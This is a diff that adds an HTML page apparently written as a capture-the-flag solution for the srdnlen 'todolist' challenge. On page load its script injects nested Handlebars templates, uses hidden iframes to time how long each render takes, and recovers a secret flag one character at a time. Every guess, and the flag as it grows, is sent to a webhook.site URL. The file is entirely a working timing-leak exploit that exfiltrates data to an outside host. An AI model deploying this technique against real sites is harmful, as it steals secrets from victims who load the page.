@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<script>
+const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
+const CHALL   = "https://todolist.challs.srdnlen.it/";
+const CHARSET = 'srdnlen{}_abcdefghijklmnopqrstuvwxyz0123456789';
+const THRESHOLD = 5000;
+const LOOPS = 7;
+const ARR = '[0,1,2,3,4,5,6,7,8,9,10]';
+
+function makeUrl(pos, char) {
+  const open  = '{{#each @root.arr}}'.repeat(LOOPS);
+  const close = '{{/each}}'.repeat(LOOPS);
+  const tpl = `{{#if (eq (lookup secret ${pos}) "${char}")}}${open}X${close}{{/if}}`;
+  return CHALL + '?data=' + encodeURIComponent(`{"arr":${ARR}}`) 
+       + '&template=' + encodeURIComponent(tpl);
+}
+
+function probe(pos, char) {
+  return new Promise(resolve => {
+    const f = document.createElement('iframe');
+    f.style = 'width:1px;height:1px;position:fixed;top:-999px';
+    const t0 = Date.now();
+    const timeout = setTimeout(() => {
+      f.remove();
+      resolve({ char, ms: Date.now()-t0, hit: true });
+    }, THRESHOLD + 2000);
+    f.onload = () => {
+      clearTimeout(timeout);
+      f.remove();
+      const ms = Date.now()-t0;
+      resolve({ char, ms, hit: ms > THRESHOLD });
+    };
+    f.src = makeUrl(pos, char);
+    document.body.appendChild(f);
+  });
+}
+
+async function exfil() {
+  await fetch(WEBHOOK + '?status=start');
+  let flag = 'srdnlen{';
+
+  for (let pos = flag.length; pos < 50; pos++) {
+    let found = false;
+    for (const char of CHARSET) {
+      const r = await probe(pos, char);
+      // ping webhook on every attempt so you see live progress
+      await fetch(`${WEBHOOK}?pos=${pos}&c=${encodeURIComponent(char)}&ms=${r.ms}&flag=${encodeURIComponent(flag)}`);
+      if (r.hit) {
+        flag += char;
+        await fetch(`${WEBHOOK}?HIT&flag=${encodeURIComponent(flag)}`);
+        if (char === '}') { await fetch(WEBHOOK + '?DONE&flag=' + encodeURIComponent(flag)); return; }
+        found = true;
+        break;
+      }
+    }
+    if (!found) { await fetch(WEBHOOK + '?stuck&pos=' + pos); break; }
+  }
+}
+
+exfil();
+</script>
+</html>
